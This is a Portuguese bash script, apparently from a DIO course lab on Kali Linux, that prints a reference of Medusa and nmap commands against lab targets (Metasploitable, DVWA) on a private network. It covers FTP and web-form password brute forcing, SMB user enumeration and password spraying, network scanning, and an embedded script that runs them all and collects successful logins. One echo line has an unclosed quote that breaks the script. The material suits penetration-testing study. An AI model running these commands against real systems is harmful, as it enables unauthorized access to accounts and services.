#!/bin/bash

# ============================================
# Medusa Attack Commands Reference
# Projeto Kali Linux + Medusa - DIO
# ============================================

# CONFIGURAÇÕES
TARGET_IP="192.168.1.100"
TARGET_WEB="192.168.1.101"
KALI_IP=$(hostname -I | awk '{print $1}')
WORDLIST_PASS="wordlists/common-passwords.txt"
WORDLIST_USERS="wordlists/users.txt"

echo "=== REFERÊNCIA DE ATAQUES COM MEDUSA ==="
echo "IP Alvo (FTP/SMB): $TARGET_IP"
echo "IP Alvo (Web): $TARGET_WEB"
echo "IP Kali: $KALI_IP"
echo ""

# ============================================
# 1. ATAQUE FTP - BRUTE FORCE
# ============================================

echo "[1] ATAQUE FTP - BRUTE FORCE"
echo "---"
echo "Comando:"
echo "medusa -h $TARGET_IP -u msfadmin -P $WORDLIST_PASS -M ftp -e ns -v 6"
echo ""
echo "Executar:"
echo "medusa -h $TARGET_IP -u msfadmin -P $WORDLIST_PASS -M ftp -e ns -v 6 -O log-ftp.txt"
echo ""
echo "Flags explicadas:"
echo "  -h: Host/IP alvo"
echo "  -u: Usuário específico"
echo "  -P: Arquivo com senhas"
echo "  -M: Módulo (ftp, ssh, smbnt, web-form)"
echo "  -e: Tentar null (-n) e senha=username (-s)"
echo "  -v: Verbosidade (6 = máximo)"
echo "  -O: Arquivo de saída/log"
echo ""

# ============================================
# 2. ATAQUE DVWA - FORMULÁRIO WEB
# ============================================

echo "[2] ATAQUE DVWA - BRUTE FORCE WEB"
echo "---"
echo "Comando (Nível Low):"
echo "medusa -h $TARGET_WEB -u admin -P $WORDLIST_PASS -M web-form \\"
echo "  -m FORM:/login.php \\"
echo "  -m FORM-USERNAME:username \\"
echo "  -m FORM-PASSWORD:password \\"
echo "  -v 6 -O log-dvwa.txt"
echo ""
echo "Executar:"
cat << 'EOF'
medusa -h 192.168.1.101 -u admin -P wordlists/common-passwords.txt -M web-form \
  -m FORM:/login.php \
  -m FORM-USERNAME:username \
  -m FORM-PASSWORD:password \
  -v 6 -O log-dvwa.txt
EOF
echo ""
echo "Parâmetros web-form:"
echo "  FORM:/path/to/form = Formulário alvo"
echo "  FORM-USERNAME = Campo de nome de usuário"
echo "  FORM-PASSWORD = Campo de senha"
echo ""

# ============================================
# 3. SMB - ENUMERAÇÃO DE USUÁRIOS
# ============================================

echo "[3] SMB - ENUMERAÇÃO DE USUÁRIOS"
echo "---"
echo "Comando (Nmap):"
echo "nmap -p 139,445 --script smb-enum-users.nse $TARGET_IP"
echo ""
echo "Executar:"
echo "nmap -p 139,445 --script smb-enum-users.nse $TARGET_IP -O enum-users.txt"
echo ""

# ============================================
# 4. SMB - PASSWORD SPRAYING
# ============================================

echo "[4] SMB - PASSWORD SPRAYING"
echo "---"
echo "Comando (Uma senha contra múltiplos usuários):"
echo "medusa -h $TARGET_IP -U $WORDLIST_USERS -p P@ssw0rd -M smbnt -v 6"
echo ""
echo "Ou múltiplas senhas:"
echo "medusa -h $TARGET_IP -U $WORDLIST_USERS -P $WORDLIST_PASS -M smbnt -t 4 -v 6 -O log-smb.txt"
echo ""
echo "Flags:"
echo "  -U: Arquivo com lista de usuários"
echo "  -p: Uma senha específica"
echo "  -P: Arquivo com múltiplas senhas"
echo "  -t: Número de threads paralelas"
echo ""

# ============================================
# 5. NMAP - DISCOVERY E MAPEAMENTO
# ============================================

echo "[5] NMAP - RECONNAISSANCE"
echo "---"
echo "Descobrir hosts na rede:"
echo "nmap -sn 192.168.1.0/24"
echo ""
echo "Scan de portas com versão:"
echo "nmap -sV --top-ports 20 $TARGET_IP"
echo ""
echo "Scan completo com scripts:"
echo "nmap -A -p- $TARGET_IP -O nmap-full.txt"
echo ""

# ============================================
# 6. ANÁLISE DE RESULTADOS
# ============================================

echo "[6] ANALISAR RESULTADOS"
echo "---"
echo "Filtrar sucessos:"
echo "grep SUCCESS log-*.txt"
echo ""
echo "Contar tentativas:"
echo "grep ATTEMPT log-*.txt | wc -l"
echo ""
echo "Ver tempo de execução:"
echo "time medusa -h $TARGET_IP -u msfadmin -P $WORDLIST_PASS -M ftp"
echo ""

# ============================================
# 7. SCRIPTS DE EXECUÇÃO AUTOMÁTICA
# ============================================

echo "[7] EXECUÇÃO AUTOMÁTICA"
echo "---
echo "Execute este script para rodar todos os testes:"
cat << 'EOF'

#!/bin/bash

TARGET_IP="192.168.1.100"
WORDLIST_PASS="wordlists/common-passwords.txt"
WORDLIST_USERS="wordlists/users.txt"

echo "Iniciando bateria de testes..."
echo ""

# Teste 1: Nmap discovery
echo "[1/5] Executando Nmap Discovery..."
nmap -sn 192.168.1.0/24 -o nmap-discovery.txt
echo "✓ Concluído"
echo ""

# Teste 2: Nmap port scan
echo "[2/5] Executando Nmap Port Scan..."
nmap -sV --top-ports 20 $TARGET_IP -o nmap-ports.txt
echo "✓ Concluído"
echo ""

# Teste 3: SMB enumeration
echo "[3/5] Executando SMB User Enumeration..."
nmap -p 139,445 --script smb-enum-users.nse $TARGET_IP -o nmap-smb-enum.txt
echo "✓ Concluído"
echo ""

# Teste 4: FTP brute force
echo "[4/5] Executando FTP Brute Force..."
medusa -h $TARGET_IP -u msfadmin -P $WORDLIST_PASS -M ftp -v 6 -O log-ftp.txt
echo "✓ Concluído"
echo ""

# Teste 5: SMB password spraying
echo "[5/5] Executando SMB Password Spraying..."
medusa -h $TARGET_IP -U $WORDLIST_USERS -p msfadmin -M smbnt -v 6 -O log-smb.txt
echo "✓ Concluído"
echo ""

echo "=== BATERIA DE TESTES COMPLETADA ==="
echo "Resultados em log-*.txt e nmap-*.txt"
echo ""

# Resumo
echo "=== RESUMO DE SUCESSOS ==="
echo "FTP:"
grep "SUCCESS" log-ftp.txt 2>/dev/null || echo "Nenhum sucesso"
echo ""
echo "SMB:"
grep "SUCCESS" log-smb.txt 2>/dev/null || echo "Nenhum sucesso"
EOF

echo ""

# ============================================
# 8. TROUBLESHOOTING
# ============================================

echo "[8] TROUBLESHOOTING"
echo "---"
echo "Verificar conectividade:"
echo "ping -c 3 $TARGET_IP"
echo ""
echo "Verificar serviços ativos:"
echo "nmap -sV --top-ports 20 $TARGET_IP"
echo ""
echo "Verificar versão Medusa:"
echo "medusa -V"
echo ""
echo "Testar FTP manualmente:"
echo "ftp $TARGET_IP"
echo "  > user: msfadmin"
echo "  > pass: msfadmin"
echo ""

echo "=== FIM DA REFERÊNCIA ==="
